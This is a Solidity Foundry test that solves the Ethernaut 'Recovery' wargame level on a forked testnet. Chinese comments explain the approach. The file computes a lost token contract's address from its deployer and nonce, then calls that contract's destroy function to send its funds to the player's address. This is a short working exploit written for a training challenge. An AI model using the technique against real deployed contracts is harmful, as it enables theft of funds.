// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../../lib/forge-std/src/Test.sol";
import {Vm} from "../../lib/forge-std/src/Vm.sol";
import {SimpleToken} from "../../src/Ethernaut/Recovery.sol";

contract Recovery is Test {
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("holesky"));
    }

    function testExploit() public {
        address playerAddress = 0xB3D6fac08D421164A414970D5225845b3A91F33F;
        vm.startPrank(playerAddress);
        // 问题的核心在于找到simpleToken的地址，可以直接到scan上找，也可以通过计算的方式找。
        address tokenAddr = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            0x70Dfcc0892c5d6E80546a26eeafBcE5a73B54Df0,
                            bytes1(0x01)
                        )
                    )
                )
            )
        ); // 由于simpleToken是由新部署的合约部署的，是第一笔交易，nonce要么0要么1，测试发现是1（0的话最后一位填0x80）
        SimpleToken simpleToken = SimpleToken(payable(tokenAddr));
        simpleToken.destroy(payable(playerAddress));
        vm.stopPrank();
        assertTrue(simpleToken.balances(playerAddress) == 0);
    }
}
